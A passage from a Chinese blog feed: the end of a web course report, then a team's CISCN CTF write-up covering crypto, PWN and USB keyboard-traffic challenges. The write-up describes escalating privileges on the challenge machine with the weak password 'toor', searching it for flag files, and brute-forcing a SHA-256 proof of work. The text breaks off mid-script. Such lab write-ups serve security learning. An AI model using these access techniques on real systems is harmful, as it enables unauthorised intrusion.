validateForm()函数对其进行空值验证。</p></li></ul><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/07/03/Web%E5%A4%A7%E4%BD%9C%E4%B8%9A/7.png" style="zoom:67%;" /><h4 id="2-6-user-html"><a href="#2-6-user-html" class="headerlink" title="2.6 user.html"></a>2.6 user.html</h4><p>这个页面也是在最后跟老师的实验要求进行对比后再补充的一个页面，具体采用了列表加浮动框架的方式进行设计，在列表左侧为链接栏目，通过在链接栏中选择页面，会加载到右侧的浮动框架中。</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/07/03/Web%E5%A4%A7%E4%BD%9C%E4%B8%9A/8.png" style="zoom:67%;" /><h3 id="3-总结"><a href="#3-总结" class="headerlink" title="3 总结"></a>3 总结</h3><p>这个站点实际上是我大一初学web前段的目的，当时我和其他几位同学一起参加挑战杯，这个站点和其相应功能是当时没有完成制作出来，虽然现在为止，比如班列定制等功能也没有写出来，至少在前段展示上比当时好了很多。</p><p>另一方面在这一次我其实参考了不少的企业页面，因为这个是一个正经的参加挑战杯和大创的项目介绍，不能做到类似于博客，很多花式的前段效果在这个页面上其实不是很合适。也有很多不够圆满的地方，比如project页面，那四个cord块实际应该链接到项目提供的四项功能，但是两年过去，这些地方还没写完…..</p><p>最后呢，是对老师要求的一些理解失误，比如说那个使用以个外部CSS文件，在后面与老师交流时，刘老师表示是至少一个外部CSS文件而我理解成了只能使用一个外部CSS文件，这是不符合正常的程序设计原则的….所以导致我采用了一种外部CSS样式存储如header，footer，body等标签样式，每个页面中的具体采用的则交给内部CSS样式进行控制。</p><blockquote><p>写在最后，这个大作业还是费了很多力气的，主要是因为老师那些神奇的要求，这边也把本次老师要求附上……</p></blockquote><pre class="line-numbers language-none"><code class="language-none">1、网站内容丰富（包括各种类型的内容：文本、图像、音频、视频等）、功能完备（至少有五个栏目）。（20分）2、HTML代码结构清晰、规范（至少主页包括HTML5新增的结构元素）。（16分）3、整个网站有一外部CSS文件控制所有页面的统一样式，每个页面的个别样式采用内部CSS。（CSS代码书写规范，选择器使用及代码书写顺序合理）（16分）4、网站整体采用HTML+CSS方式布局页面（至少在一个页面采用浮动框架、至少在一个页面采用多列弹性盒、至少在一个页面使用CSS表格），页面布局合理。（18分）5、网站至少包含一个表单页面，表单页面中至少有一个输入栏位采用JS进行合法性验证，并采用pattern。（16）6、至少包含一个动画（CSS）或动态窗口（JS）或CSS响应式设计，至少在一页页面上设置动态样式。（8分）7、目录结构规范、文件名命名规范、各种标识符命名规范。（6分）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这玩意因为我一开始也没怎么考虑这些内容，然后…..看见这个之后大改……..</p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 实验报告 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Debuggerrr²战队CISCN初赛解题记录</title>
      <link href="/2022/06/09/Debuggerrr%C2%B2%E6%88%98%E9%98%9FCISCN%E5%88%9D%E8%B5%9B%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2022/06/09/Debuggerrr%C2%B2%E6%88%98%E9%98%9FCISCN%E5%88%9D%E8%B5%9B%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a><strong>Crypto</strong></h2><h4 id="签到电台"><a href="#签到电台" class="headerlink" title="签到电台"></a><strong>签到电台</strong></h4><p>签到题，开始没看到豪密剖析，对照密码表一个一个找的，额。将7个电码和密码本前28个数字每四个一组进行模十加法，看示例是加猜测全部是加运算，得到电码答案后send即可。 </p><h4 id="基于挑战码的双向认证"><a href="#基于挑战码的双向认证" class="headerlink" title="基于挑战码的双向认证"></a><strong>基于挑战码的双向认证</strong></h4><p>密码学题目，但完全不是以密码学方法完成的…该题是一道双向验证密文题目，根据题目文档进入 src/login_user 模块，分析<code>proc_login_response</code>函数。一顿分析后发现很多函数看不懂，突然想到题目说明服务端验证函数已完成，找到<code>login_server</code>模块进入查看函数，对照两函数，但是不知道怎么计算<code>Mb</code>来和 <code>Mb</code>对比，思路线索断了。</p><p>题目存在flag验证机制，猜测靶机存在flag文件，开始暴力查找。 </p><p>首先尝试文件名搜索，排除若干无权限文件得到两个 txt 文件，尝试提交，正确。</p><h4 id="基于挑战码的双向认证2"><a href="#基于挑战码的双向认证2" class="headerlink" title="基于挑战码的双向认证2"></a><strong>基于挑战码的双向认证2</strong></h4><p>同上。 </p><h4 id="基于挑战码的双向认证3"><a href="#基于挑战码的双向认证3" class="headerlink" title="基于挑战码的双向认证3"></a><strong>基于挑战码的双向认证3</strong></h4><p>采取前两道题的思路，无果。 尝试弱密码**(toor)**，提权成功，再次暴力搜索找到flag文件。</p><h4 id="ISO9798"><a href="#ISO9798" class="headerlink" title="ISO9798"></a><strong>ISO9798</strong></h4><p>看提示ISO9798-2，额。。没怎么接触过，直接nc看题，发现得知sha256的后部分，直接爆破。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib data<span class="token operator">=</span> <span class="token string">'Gt1DDTjUUYIuQscO'</span> res <span class="token operator">=</span> <span class="token string">'e9e04036a480e68bb4d3897939bafd6dec3767ac9d552d17e000709ac08fefa7'</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>         <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>             <span class="token keyword">for</span> m <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                 s <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span> <span class="token operator">+</span> data                 <span class="token keyword">if</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span>s<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> res<span class="token punctuation">:</span>                     <span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>                     <span class="token keyword">break</span> s <span class="token operator">=</span> <span class="token string">'YWAVGt1DDTjUUYIuQscO'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第二步提示发送一个128bit的16进制数，python随机生成一个。 </p><p>第三步给了Encrypt(rA||rB||B, k)，要求给出Encrypt(rB||rA, k)，并未给出加密函数，因此猜测是在明 </p><p>文上动一些手脚即可。猜测为ECB或者CBC轮换加密。 </p><p>最后根据加密结果为96位，并且轮换参数有rA，rB，B三个，猜测为ECB加密并且分三组轮换，因此 </p><p>rA,rB和B分别对应密文三部分，要求Encrypt(rB||rA, k)，只需取给出密文的前64位倒置轮换即可。 </p><pre class="line-numbers language-python" data-language="python"><code class="language-python">s <span class="token operator">=</span> <span class="token string">'83368a8ab47877c4e739d1455a6f15211716f83438b58feba5a83f3c3a5c5774847790a60378dbb 4f39c6400337bbe8c'</span> <span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">:</span><span class="token number">64</span><span class="token punctuation">]</span> <span class="token operator">+</span> s<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">)</span> res <span class="token operator">=</span> <span class="token string">'1716f83438b58feba5a83f3c3a5c577483368a8ab47877c4e739d1455a6f1521'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a><strong>PWN</strong></h2><h4 id="login-nomal"><a href="#login-nomal" class="headerlink" title="login-nomal"></a><strong>login-nomal</strong></h4><p>拿到文件后，首先 check 一下保护措施,全绿…保护全开</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a><strong>Misc</strong></h2><h4 id="问卷调查"><a href="#问卷调查" class="headerlink" title="问卷调查"></a><strong>问卷调查</strong></h4><p>问卷结束后得flag。</p><h4 id="ez-usb"><a href="#ez-usb" class="headerlink" title="ez_usb"></a><strong>ez_usb</strong></h4><p>首先题目给的提示是这个是键盘流量，那么我们搜索8个字节长度的数据包，这里发现有两个Destination的数据包的长度是8，说明键盘给两个地方输入了值。</p><p> 利用tshark分别提取出压缩包和压缩密码</p><pre class="line-numbers language-none"><code class="language-none">tshark -r .&#x2F;ez_usb.pcapng -Y &#39;usb.data_len &#x3D;&#x3D; 8&#39; -Y &#39;usb.src &#x3D;&#x3D;&quot;2.8.1&quot;&#39; -T fields -e usb.capdata &gt; 1.txttshark -r .&#x2F;ez_usb.pcapng -Y &#39;usb.data_len &#x3D;&#x3D; 8&#39; -Y &#39;usb.src &#x3D;&#x3D;&quot;2.10.1&quot;&#39; -T fields -e usb.capdata &gt; 2.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>再利用脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">normalKeys <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"04"</span><span class="token punctuation">:</span><span class="token string">"a"</span><span class="token punctuation">,</span> <span class="token string">"05"</span><span class="token punctuation">:</span><span class="token string">"b"</span><span class="token punctuation">,</span> <span class="token string">"06"</span><span class="token punctuation">:</span><span class="token string">"c"</span><span class="token punctuation">,</span> <span class="token string">"07"</span><span class="token punctuation">:</span><span class="token string">"d"</span><span class="token punctuation">,</span> <span class="token string">"08"</span><span class="token punctuation">:</span><span class="token string">"e"</span><span class="token punctuation">,</span> <span class="token string">"09"</span><span class="token punctuation">:</span><span class="token string">"f"</span><span class="token punctuation">,</span> <span class="token string">"0a"</span><span class="token punctuation">:</span><span class="token string">"g"</span><span class="token punctuation">,</span> <span class="token string">"0b"</span><span class="token punctuation">:</span><span class="token string">"h"</span><span class="token punctuation">,</span> <span class="token string">"0c"</span><span class="token punctuation">:</span><span class="token string">"i"</span><span class="token punctuation">,</span> <span class="token string">"0d"</span><span class="token punctuation">:</span><span class="token string">"j"</span><span class="token punctuation">,</span> <span class="token string">"0e"</span><span class="token punctuation">:</span><span class="token string">"k"</span><span class="token punctuation">,</span> <span class="token string">"0f"</span><span class="token punctuation">:</span><span class="token string">"l"</span><span class="token punctuation">,</span> <span class="token string">"10"</span><span class="token punctuation">:</span><span class="token string">"m"</span><span class="token punctuation">,</span> <span class="token string">"11"</span><span class="token punctuation">:</span><span class="token string">"n"</span><span class="token punctuation">,</span> <span class="token string">"12"</span><span class="token punctuation">:</span><span class="token string">"o"</span><span class="token punctuation">,</span> <span class="token string">"13"</span><span class="token punctuation">:</span><span class="token string">"p"</span><span class="token punctuation">,</span> <span class="token string">"14"</span><span class="token punctuation">:</span><span class="token string">"q"</span><span class="token punctuation">,</span> <span class="token string">"15"</span><span class="token punctuation">:</span><span class="token string">"r"</span><span class="token punctuation">,</span> <span class="token string">"16"</span><span class="token punctuation">:</span><span class="token string">"s"</span><span class="token punctuation">,</span> <span class="token string">"17"</span><span class="token punctuation">:</span><span class="token string">"t"</span><span class="token punctuation">,</span> <span class="token string">"18"</span><span class="token punctuation">:</span><span class="token string">"u"</span><span class="token punctuation">,</span> <span class="token string">"19"</span><span class="token punctuation">:</span><span class="token string">"v"</span><span class="token punctuation">,</span> <span class="token string">"1a"</span><span class="token punctuation">:</span><span class="token string">"w"</span><span class="token punctuation">,</span> <span class="token string">"1b"</span><span class="token punctuation">:</span><span class="token string">"x"</span><span class="token punctuation">,</span> <span class="token string">"1c"</span><span class="token punctuation">:</span><span class="token string">"y"</span><span class="token punctuation">,</span> <span class="token string">"1d"</span><span class="token punctuation">:</span><span class="token string">"z"</span><span class="token punctuation">,</span><span class="token string">"1e"</span><span class="token punctuation">:</span><span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token string">"1f"</span><span class="token punctuation">:</span><span class="token string">"2"</span><span class="token punctuation">,</span> <span class="token string">"20"</span><span class="token punctuation">:</span><span class="token string">"3"</span><span class="token punctuation">,</span> <span class="token string">"21"</span><span class="token punctuation">:</span><span class="token string">"4"</span><span class="token punctuation">,</span> <span class="token string">"22"</span><span class="token punctuation">:</span><span class="token string">"5"</span><span class="token punctuation">,</span> <span class="token string">"23"</span><span class="token punctuation">:</span><span class="token string">"6"</span><span class="token punctuation">,</span><span class="token string">"24"</span><span class="token punctuation">:</span><span class="token string">"7"</span><span class="token punctuation">,</span><span class="token string">"25"</span><span class="token punctuation">:</span><span class="token string">"8"</span><span class="token punctuation">,</span><span class="token string">"26"</span><span class="token punctuation">:</span><span class="token string">"9"</span><span class="token punctuation">,</span><span class="token string">"27"</span><span class="token punctuation">:</span><span class="token string">"0"</span><span class="token punctuation">,</span><span class="token string">"28"</span><span class="token punctuation">:</span><span class="token string">"&lt;RET>"</span><span class="token punctuation">,</span><span class="token string">"29"</span><span class="token punctuation">:</span><span class="token string">"&lt;ESC>"</span><span class="token punctuation">,</span><span class="token string">"2a"</span><span class="token punctuation">:</span><span class="token string">"&lt;DEL>"</span><span class="token punctuation">,</span> <span class="token string">"2b"</span><span class="token punctuation">:</span><span class="token string">"\t"</span><span class="token punctuation">,</span><span class="token string">"2c"</span><span class="token punctuation">:</span><span class="token string">"&lt;SPACE>"</span><span class="token punctuation">,</span><span class="token string">"2d"</span><span class="token punctuation">:</span><span class="token string">"-"</span><span class="token punctuation">,</span><span class="token string">"2e"</span><span class="token punctuation">:</span><span class="token string">"="</span><span class="token punctuation">,</span><span class="token string">"2f"</span><span class="token punctuation">:</span><span class="token string">"["</span><span class="token punctuation">,</span><span class="token string">"30"</span><span class="token punctuation">:</span><span class="token string">"]"</span><span class="token punctuation">,</span><span class="token string">"31"</span><span class="token punctuation">:</span><span class="token string">"\\"</span><span class="token punctuation">,</span><span class="token string">"32"</span><span class="token punctuation">:</span><span class="token string">"&lt;NON>"</span><span class="token punctuation">,</span><span class="token string">"33"</span><span class="token punctuation">:</span><span class="token string">";"</span><span class="token punctuation">,</span><span class="token string">"34"</span><span class="token punctuation">:</span><span class="token string">"'"</span><span class="token punctuation">,</span><span class="token string">"35"</span><span class="token punctuation">:</span><span class="token string">"&lt;GA>"</span><span class="token punctuation">,</span><span class="token string">"36"</span><span class="token punctuation">:</span><span class="token string">","</span><span class="token punctuation">,</span><span class="token string">"37"</span><span class="token punctuation">:</span><span class="token string">"."</span><span class="token punctuation">,</span><span class="token string">"38"</span><span class="token punctuation">:</span><span class="token string">"/"</span><span class="token punctuation">,</span><span class="token string">"39"</span><span class="token punctuation">:</span><span class="token string">"&lt;CAP>"</span><span class="token punctuation">,</span><span class="token string">"3a"</span><span class="token punctuation">:</span><span class="token string">"&lt;F1>"</span><span class="token punctuation">,</span><span class="token string">"3b"</span><span class="token punctuation">:</span><span class="token string">"&lt;F2>"</span><span class="token punctuation">,</span> <span class="token string">"3c"</span><span class="token punctuation">:</span><span class="token string">"&lt;F3>"</span><span class="token punctuation">,</span><span class="token string">"3d"</span><span class="token punctuation">:</span><span class="token string">"&lt;F4>"</span><span class="token punctuation">,</span><span class="token string">"3e"</span><span class="token punctuation">:</span><span class="token string">"&lt;F5>"</span><span class="token punctuation">,</span><span class="token string">"3f"</span><span class="token punctuation">:</span><span class="token string">"&lt;F6>"</span><span class="token punctuation">,</span><span class="token string">"40"</span><span class="token punctuation">:</span><span class="token string">"&lt;F7>"</span><span class="token punctuation">,</span><span class="token string">"41"</span><span class="token punctuation">:</span><span class="token string">"&lt;F8>"</span><span class="token punctuation">,</span><span class="token string">"42"</span><span class="token punctuation">:</span><span class="token string">"&lt;F9>"</span><span class="token punctuation">,</span><span class="token string">"43"</span><span class="token punctuation">:</span><span class="token string">"&lt;F10>"</span><span class="token punctuation">,</span><span class="token string">"44"</span><span class="token punctuation">:</span><span class="token string">"&lt;F11>"</span><span class="token punctuation">,</span><span class="token string">"45"</span><span class="token punctuation">:</span><span class="token string">"&lt;F12>"</span><span class="token punctuation">&#125;</span>shiftKeys <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"04"</span><span class="token punctuation">:</span><span class="token string">"A"</span><span class="token punctuation">,</span> <span class="token string">"05"</span><span class="token punctuation">:</span><span class="token string">"B"</span><span class="token punctuation">,</span> <span class="token string">"06"</span><span class="token punctuation">:</span><span class="token string">"C"</span><span class="token punctuation">,</span> <span class="token string">"07"</span><span class="token punctuation">:</span><span class="token string">"D"</span><span class="token punctuation">,</span> <span class="token string">"08"</span><span class="token punctuation">:</span><span class="token string">"E"</span><span class="token punctuation">,</span> <span class="token string">"09"</span><span class="token punctuation">:</span><span class="token string">"F"</span><span class="token punctuation">,</span> <span class="token string">"0a"</span><span class="token punctuation">:</span><span class="token string">"G"</span><span class="token punctuation">,</span> <span class="token string">"0b"</span><span class="token punctuation">:</span><span class="token string">"H"</span><span class="token punctuation">,</span> <span class="token string">"0c"</span><span class="token punctuation">:</span><span class="token string">"I"</span><span class="token punctuation">,</span> <span class="token string">"0d"</span><span class="token punctuation">:</span><span class="token string">"J"</span><span class="token punctuation">,</span> <span class="token string">"0e"</span><span class="token punctuation">:</span><span class="token string">"K"</span><span class="token punctuation">,</span> <span class="token string">"0f"</span><span class="token punctuation">:</span><span class="token string">"L"</span><span class="token punctuation">,</span> <span class="token string">"10"</span><span class="token punctuation">:</span><span class="token string">"M"</span><span class="token punctuation">,</span> <span class="token string">"11"</span><span class="token punctuation">:</span><span class="token string">"N"</span><span class="token punctuation">,</span> <span class="token string">"12"</span><span class="token punctuation">:</span><span class="token string">"O"</span><span class="token punctuation">,</span> <span class="token string">"13"</span><span class="token punctuation">:</span><span class="token string">"P"</span><span class="token punctuation">,</span> <span class="token string">"14"</span><span class="token punctuation">:</span><span class="token string">"Q"</span><span class="token punctuation">,</span> <span class="token string">"15"</span><span class="token punctuation">:</span><span class="token string">"R"</span><span class="token punctuation">,</span> <span class="token string">"16"</span><span class="token punctuation">:</span><span class="token string">"S"</span><span class="token punctuation">,</span> <span class="token string">"17"</span><span class="token punctuation">:</span><span class="token string">"T"</span><span class="token punctuation">,</span> <span class="token string">"18"</span><span class="token punctuation">:</span><span class="token string">"U"</span><span class="token punctuation">,</span> <span class="token string">"19"</span><span class="token punctuation">:</span><span class="token string">"V"</span><span class="token punctuation">,</span> <span class="token string">"1a"</span><span class="token punctuation">:</span><span class="token string">"W"</span><span class="token punctuation">,</span> <span class="token string">"1b"</span><span class="token punctuation">:</span><span class="token string">"X"</span><span class="token punctuation">,</span> <span class="token string">"1c"</span><span class="token punctuation">:</span><span class="token string">"Y"</span><span class="token punctuation">,</span> <span class="token string">"1d"</span><span class="token punctuation">:</span><span class="token string">"Z"</span><span class="token punctuation">,</span><span class="token string">"1e"</span><span class="token punctuation">:</span><span class="token string">"!"</span><span class="token punctuation">,</span> <span class="token string">"1f"</span><span class="token punctuation">:</span><span class="token string">"@"</span><span class="token punctuation">,</span> <span class="token string">"20"</span><span class="token punctuation">:</span><span class="token string">"#"</span><span class="token punctuation">,</span> <span class="token string">"21"</span><span class="token punctuation">:</span><span class="token string">"$"</span><span class="token punctuation">,</span> <span class="token string">"22"</span><span class="token punctuation">:</span><span class="token string">"%"</span><span class="token punctuation">,</span> <span class="token string">"23"</span><span class="token punctuation">:</span><span class="token string">"^"</span><span class="token punctuation">,</span><span class="token string">"24"</span><span class="token punctuation">:</span><span class="token string">"&amp;"</span><span class="token punctuation">,</span><span class="token string">"25"</span><span class="token punctuation">:</span><span class="token string">"*"</span><span class="token punctuation">,</span><span class="token string">"26"</span><span class="token punctuation">:</span><span class="token string">"("</span><span class="token punctuation">,</span><span class="token string">"27"</span><span class="token punctuation">:</span><span class="token string">")"</span><span class="token punctuation">,</span><span class="token string">"28"</span><span class="token punctuation">:</span><span class="token string">"&lt;RET>"</span><span class="token punctuation">,</span><span class="token string">"29"</span><span class="token punctuation">:</span><span class="token string">"&lt;ESC>"</span><span class="token punctuation">,</span><span class="token string">"2a"</span><span class="token punctuation">:</span><span class="token string">"&lt;DEL>"</span><span class="token punctuation">,</span> <span class="token string">"2b"</span><span class="token punctuation">:</span><span class="token string">"\t"</span><span class="token punctuation">,</span><span class="token string">"2c"</span><span class="token punctuation">:</span><span class="token string">"&lt;SPACE>"</span><span class="token punctuation">,</span><span class="token string">"2d"</span><span class="token punctuation">:</span><span class="token string">"_"</span><span class="token punctuation">,</span><span class="token string">"2e"</span><span class="token punctuation">:</span><span class="token string">"+"</span><span class="token punctuation">,</span><span class="token string">"2f"</span><span class="token punctuation">:</span><span class="token string">"&#123;"</span><span class="token punctuation">,</span><span class="token string">"30"</span><span class="token punctuation">:</span><span class="token string">"&#125;"</span><span class="token punctuation">,</span><span class="token string">"31"</span><span class="token punctuation">:</span><span class="token string">"|"</span><span class="token punctuation">,</span><span class="token string">"32"</span><span class="token punctuation">:</span><span class="token string">"&lt;NON>"</span><span class="token punctuation">,</span><span class="token string">"33"</span><span class="token punctuation">:</span><span class="token string">"\""</span><span class="token punctuation">,</span><span class="token string">"34"</span><span class="token punctuation">:</span><span class="token string">":"</span><span class="token punctuation">,</span><span class="token string">"35"</span><span class="token punctuation">:</span><span class="token string">"&lt;GA>"</span><span class="token punctuation">,</span><span class="token string">"36"</span><span class="token punctuation">:</span><span class="token string">"&lt;"</span><span class="token punctuation">,</span><span class="token string">"37"</span><span class="token punctuation">:</span><span class="token string">">"</span><span class="token punctuation">,</span><span class="token string">"38"</span><span class="token punctuation">:</span><span class="token string">"?"</span><span class="token punctuation">,</span><span class="token string">"39"</span><span class="token punctuation">:</span><span class="token string">"&lt;CAP>"</span><span class="token punctuation">,</span><span class="token string">"3a"</span><span class="token punctuation">:</span><span class="token string">"&lt;F1>"</span><span class="token punctuation">,</span><span class="token string">"3b"</span><span class="token punctuation">:</span><span class="token string">"&lt;F2>"</span><span class="token punctuation">,</span> <span class="token string">"3c"</span><span class="token punctuation">:</span><span class="token string">"&lt;F3>"</span><span class="token punctuation">,</span><span class="token string">"3d"</span><span class="token punctuation">:</span><span class="token string">"&lt;F4>"</span><span class="token punctuation">,</span><span class="token string">"3e"</span><span class="token punctuation">:</span><span class="token string">"&lt;F5>"</span><span class="token punctuation">,</span><span class="token string">"3f"</span><span class="token punctuation">:</span><span class="token string">"&lt;F6>"</span><span class="token punctuation">,</span><span class="token string">"40"</span><span class="token punctuation">:</span><span class="token string">"&lt;F7>"</span><span class="token punctuation">,</span><span class="token string">"41"</span><span class="token punctuation">:</span><span class="token string">"&lt;F8>"</span><span class="token punctuation">,</span><span class="token string">"42"</span><span class="token punctuation">:</span><span class="token string">"&lt;F9>"</span><span class="token punctuation">,</span><span class="token string">"43"</span><span class="token punctuation">:</span><span class="token string">"&lt;F10>"</span><span class="token punctuation">,</span><span class="token string">"44"</span><span class="token punctuation">:</span><span class="token string">"&lt;F11>"</span><span class="token punctuation">,</span><span class="token string">"45"</span><span class="token punctuation">:</span><span class="token string">"&lt;F12>"</span><span class="token punctuation">&#125;</span><span class="token keyword">def</span> <span class="token function">out</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    keys<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span>    output <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> line <span class="token keyword">in</span> keys<span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> line<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> <span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">and</span> line<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'2'</span><span class="token punctuation">)</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">"00"</span><span class="token punctuation">:</span>                 <span class="token keyword">continue</span>            <span class="token keyword">if</span> line<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token keyword">in</span> normalKeys<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                output <span class="token operator">+=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span>normalKeys<span class="token punctuation">[</span>line<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span>shiftKeys<span class="token punctuation">[</span>line<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span>line<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'2'</span><span class="token punctuation">]</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                output <span class="token operator">+=</span> <span class="token punctuation">[</span><span class="token string">'[unknown]'</span><span class="token punctuation">]</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">pass</span>    keys<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>flag<span class="token operator">=</span><span class="token number">0</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        a<span class="token operator">=</span>output<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">'&lt;DEL>'</span><span class="token punctuation">)</span>        <span class="token keyword">del</span> output<span class="token punctuation">[</span>a<span class="token punctuation">]</span>        <span class="token keyword">del</span> output<span class="token punctuation">[</span>a<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> output<span class="token 